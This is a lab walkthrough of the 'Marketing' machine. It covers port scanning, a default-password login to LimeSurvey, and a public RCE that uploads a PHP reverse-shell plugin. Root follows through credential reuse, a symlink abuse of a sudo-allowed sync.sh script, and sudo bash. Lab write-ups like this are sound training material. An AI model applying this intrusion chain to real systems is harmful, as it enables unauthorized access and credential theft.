---
icon: ubuntu
---

# Marketing - Intermediate

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```
# Nmap TCP
nmap -A -T4 -p- -Pn 192.168.174.225 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-29 22:11 EDT
Nmap scan report for 192.168.174.225
Host is up (0.033s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 62:36:1a:5c:d3:e3:7b:e1:70:f8:a3:b3:1c:4c:24:38 (RSA)
|   256 ee:25:fc:23:66:05:c0:c1:ec:47:c6:bb:00:c7:4f:53 (ECDSA)
|_  256 83:5c:51:ac:32:e5:3a:21:7c:f6:c2:cd:93:68:58:d8 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: marketing.pg - Digital Marketing for you!
|_http-server-header: Apache/2.4.41 (Ubuntu)
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 110/tcp)
HOP RTT      ADDRESS
1   29.27 ms 192.168.45.1
2   30.67 ms 192.168.45.254
3   31.20 ms 192.168.251.1
4   29.91 ms 192.168.174.225
```

### <mark style="color:$primary;">HTTP Port 80 TCP</mark>

<figure><img src="../../.gitbook/assets/image (1087).png" alt=""><figcaption></figcaption></figure>

Before I started manually enumerating the website I had dirsearch running, and when I came back to check I found an interesting endpoint

```
dirsearch -u http://192.168.174.225/
```

<figure><img src="../../.gitbook/assets/image (1088).png" alt=""><figcaption></figcaption></figure>

Upon visiting the /old endpoint I came across the same site.

<figure><img src="../../.gitbook/assets/image (1089).png" alt=""><figcaption></figcaption></figure>

Checking the source code I came across a subdomain, I'll add both to my /etc/hosts file

<figure><img src="../../.gitbook/assets/image (1090).png" alt=""><figcaption></figcaption></figure>

```
192.168.174.225	marketing.pg customers-survey.marketing.pg
```

When I visited the subdomain I was greeted by LimSurvey

<figure><img src="../../.gitbook/assets/image (1091).png" alt=""><figcaption></figcaption></figure>

We have a potential user with the email <mark style="color:$info;">**admin@marketing.pg**</mark> There’s no navigation, but there is a **`/admin`** directory.

<figure><img src="../../.gitbook/assets/image (1092).png" alt=""><figcaption></figcaption></figure>

I knew from earlier there was a admin account and managed to guess the default credentials as <mark style="color:$info;">**admin:password**</mark>

<figure><img src="../../.gitbook/assets/image (1093).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1094).png" alt=""><figcaption></figcaption></figure>

We got the version of LimeSurvey on the Bottom!

### <mark style="color:$primary;">Lime Survey 5.3.24 RCE</mark>

<figure><img src="../../.gitbook/assets/image (1095).png" alt=""><figcaption></figcaption></figure>

Great! There is an exploit available at this [**repo**](https://github.com/Y1LD1R1M-1337/Limesurvey-RCE) Following the steps in the repo have led to shell!

```
git clone https://github.com/Y1LD1R1M-1337/Limesurvey-RCE
```

#### <mark style="color:$primary;">Instructions</mark>

<figure><img src="../../.gitbook/assets/image (1096).png" alt=""><figcaption></figcaption></figure>

In php-rev.php I changed the following

<figure><img src="../../.gitbook/assets/image (1104).png" alt=""><figcaption></figcaption></figure>

Then I zipped php-rev.php Deimos.zip

<figure><img src="../../.gitbook/assets/image (1105).png" alt=""><figcaption></figcaption></figure>

Go to Configuration -> Plugins -> Upload & Install and upload the zip file

<figure><img src="../../.gitbook/assets/image (1099).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1100).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1101).png" alt=""><figcaption></figcaption></figure>

Now we need to activate the plugin for me it was on page 2

<figure><img src="../../.gitbook/assets/image (1102).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1103).png" alt=""><figcaption></figcaption></figure>

Make sure you have a listener ready on your designated port, then visit this link to get a reverse shell:

```
http://customers-survey.marketing.pg/upload/plugins/Y1LD1R1M/php-rev.php
```

<figure><img src="../../.gitbook/assets/image (1106).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:blue;">Privilege Escalation</mark>

<figure><img src="../../.gitbook/assets/image (1107).png" alt=""><figcaption></figcaption></figure>

There are 2 users besides root,

Looking for default location of limesurvey config files

<figure><img src="../../.gitbook/assets/image (1108).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1109).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1110).png" alt=""><figcaption></figcaption></figure>

```
limesurver_user:EzPwz2022_dev1$$23!!
```

Reveals some creds for mysql database

<figure><img src="../../.gitbook/assets/image (1111).png" alt=""><figcaption></figcaption></figure>

mysql is running, but before I am going to jump into my sql I am going to see if there is credential reuse on any of the users

### <mark style="color:$primary;">Credential Reuse</mark>

<figure><img src="../../.gitbook/assets/image (1112).png" alt=""><figcaption></figcaption></figure>

it worked! those creds work for t.miller

```
t.miller:EzPwz2022_dev1$$23!!
```

<figure><img src="../../.gitbook/assets/image (1113).png" alt=""><figcaption></figcaption></figure>

We can run /usr/bin/sync.sh as m.sander

```
t.miller@marketing:~$ cat /usr/bin/sync.sh
cat /usr/bin/sync.sh
#! /bin/bash

if [ -z $1 ]; then
    echo "error: note missing"
    exit
fi

note=$1

if [[ "$note" =~ .*m.sander.* ]]; then
    echo "error: forbidden"
    exit
fi

difference=$(diff /home/m.sander/personal/notes.txt $note)

if [[ -z $difference ]]; then
    echo "no update"
    exit
fi

echo "Difference: $difference"

cp $note /home/m.sander/personal/notes.txt

echo "[+] Updated."
```

The script is updating **`/home/m.sander/personal/notes.txt`** if there’s any difference. However, it will display the difference as well. We could create a random file and link it to a file that only **`m.sander`** could read, then ran the **`sync.sh`** . This will show the difference, right, and we will be able to see the contents. Now I have to figure out what files m.sander can read, I was lost and for some time and had to look it up.

<figure><img src="../../.gitbook/assets/image (1114).png" alt=""><figcaption></figcaption></figure>

So apparently there is a file name <mark style="color:$info;">**creds-for-2022.txt**</mark> inside the mlocate.db and this file is located at <mark style="color:$info;">**/home/m.sander/personal**</mark>

Now that I knot that I'll make a symlink to that file and run sync.sh and hope something good comes out of it!

```
ln -sf /home/m.sander/personal/creds-for-2022.txt be_creds
```

```
sudo -u m.sander /usr/bin/sync.sh be_creds
```

<figure><img src="../../.gitbook/assets/image (1115).png" alt=""><figcaption></figcaption></figure>

Ok it worked we got the difference and we got a creds

```
m.sander:pa$$word@123$$4!!
m.sander:EzPwz2022_dev1$$23!!
m.sander:EzPwz2022_12345678#!
```

I was able to ssh with the 3rd pair of credentials

```
ssh m.sander@192.168.174.225
```

<figure><img src="../../.gitbook/assets/image (1116).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">Sudo All</mark>

From here to get to root we can simply run:

```
sudo /bin/bash
```

<figure><img src="../../.gitbook/assets/image (1117).png" alt=""><figcaption></figcaption></figure>
